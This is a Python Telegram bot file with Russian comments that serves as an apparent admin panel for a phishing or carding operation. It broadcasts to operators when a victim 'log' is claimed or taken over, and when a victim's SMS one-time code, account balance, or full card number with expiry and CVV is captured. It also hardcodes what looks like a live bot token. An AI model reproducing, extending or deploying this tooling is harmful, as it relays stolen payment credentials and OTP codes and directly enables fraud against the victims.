# [file name]: admin_bot.py
# [file content begin]
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command

# Инициализация админского бота
ADMIN_BOT_TOKEN = "8219818010:AAHtrunFkumr6i7hceJGIrSvqjXgluokDeI"  # Замените на реальный токен
admin_bot = Bot(token=ADMIN_BOT_TOKEN)
admin_dp = Dispatcher()

# Список для хранения ID всех пользователей, которые запустили бота
active_users = set()

async def send_to_all_admins(message: str, parse_mode: str = "HTML"):
    """Отправляет сообщение всем пользователям админского бота"""
    for user_id in active_users.copy():  # Используем копию чтобы избежать изменений во время итерации
        try:
            await admin_bot.send_message(chat_id=user_id, text=message, parse_mode=parse_mode)
        except Exception as e:
            print(f"Не удалось отправить уведомление пользователю {user_id}: {e}")
            # Удаляем пользователя из списка если бот заблокирован
            active_users.discard(user_id)

async def notify_log_taken(booking_id: str, client_id: str, username: str, user_id: int):
    """Уведомление о взятии лога"""
    message = (
        f"📥 <b>Лог взят</b>\n\n"
        f"🆔 #{booking_id} || #{client_id}\n"
        f"👤 Пользователь: @{username}\n"
        f"🔢 ID: {user_id}"
    )
    await send_to_all_admins(message)

async def notify_log_taken_over(booking_id: str, client_id: str, new_username: str, new_user_id: int, old_user_id: int):
    """Уведомление о перехвате лога"""
    message = (
        f"🔄 <b>Лог перехвачен</b>\n\n"
        f"🆔 #{booking_id} || #{client_id}\n"
        f"👤 Новый владелец: @{new_username}\n"
        f"🔢 ID: {new_user_id}\n"
        f"📤 Предыдущий владелец ID: {old_user_id}"
    )
    await send_to_all_admins(message)

async def notify_action(booking_id: str, client_id: str, username: str, user_id: int, action: str, action_text: str):
    """Уведомление о действии с логом"""
    message = (
        f"⚡ <b>Действие с логом</b>\n\n"
        f"🆔 #{booking_id} || #{client_id}\n"
        f"👤 Пользователь: @{username}\n"
        f"🔢 ID: {user_id}\n"
        f"📝 Действие: {action_text}"
    )
    await send_to_all_admins(message)

async def notify_user_response(booking_id: str, client_id: str, username: str, user_id: int, response: str):
    """Уведомление о ответе пользователя"""
    message = (
        f"💬 <b>Ответ пользователя</b>\n\n"
        f"🆔 #{booking_id} || #{client_id}\n"
        f"👤 Пользователь: @{username}\n"
        f"🔢 ID: {user_id}\n"
        f"📨 Ответ: {response}"
    )
    await send_to_all_admins(message)

async def notify_balance(booking_id: str, client_id: str, username: str, user_id: int, balance: str):
    """Уведомление о получении баланса"""
    message = (
        f"💰 <b>Получен баланс</b>\n\n"
        f"🆔 #{booking_id} || #{client_id}\n"
        f"👤 Пользователь: @{username}\n"
        f"🔢 ID: {user_id}\n"
        f"💵 Сумма: {balance} AED"
    )
    await send_to_all_admins(message)

async def notify_sms(booking_id: str, client_id: str, username: str, user_id: int, sms_code: str):
    """Уведомление о получении SMS"""
    message = (
        f"📱 <b>Получен SMS код</b>\n\n"
        f"🆔 #{booking_id} || #{client_id}\n"
        f"👤 Пользователь: @{username}\n"
        f"🔢 ID: {user_id}\n"
        f"🔢 Код: {sms_code}"
    )
    await send_to_all_admins(message)

async def notify_card_change(booking_id: str, client_id: str, username: str, user_id: int, new_card: str, expire: str, cvv: str):
    """Уведомление о смене карты"""
    message = (
        f"🔄 <b>Смена карты</b>\n\n"
        f"🆔 #{booking_id} || #{client_id}\n"
        f"👤 Пользователь: @{username}\n"
        f"🔢 ID: {user_id}\n"
        f"💳 Новая карта: {new_card}\n"
        f"📅 Срок: {expire}\n"
        f"🔒 CVV: {cvv}"
    )
    await send_to_all_admins(message)

# Команды для админского бота
@admin_dp.message(Command("start"))
async def admin_start(message: types.Message):
    # Добавляем пользователя в список активных
    active_users.add(message.from_user.id)
    
    await message.answer(
        "👨‍💼 <b>Админский бот мониторинга</b>\n\n"
        "Этот бот транслирует все действия основного бота:\n"
        "• Взятие логов\n• Действия с кнопками управления\n• Ответы пользователей\n"
        "• Получение балансов и SMS кодов\n• Смены карт\n\n"
        "Все уведомления приходят автоматически.\n\n"
        f"✅ Вы добавлены в список получателей. Активных пользователей: {len(active_users)}",
        parse_mode="HTML"
    )

@admin_dp.message(Command("status"))
async def admin_status(message: types.Message):
    await message.answer(
        f"✅ Бот работает в режиме мониторинга\n"
        f"👥 Активных пользователей: {len(active_users)}"
    )

@admin_dp.message(Command("users"))
async def admin_users(message: types.Message):
    users_list = "\n".join([f"👤 ID: {user_id}" for user_id in active_users])
    await message.answer(
        f"📊 Активные пользователи бота:\n\n{users_list if users_list else 'Нет активных пользователей'}"
    )

async def start_admin_bot():
    """Запуск админского бота"""
    print("Админский бот запущен...")
    await admin_dp.start_polling(admin_bot)

if __name__ == "__main__":
    asyncio.run(start_admin_bot())
# [file content end]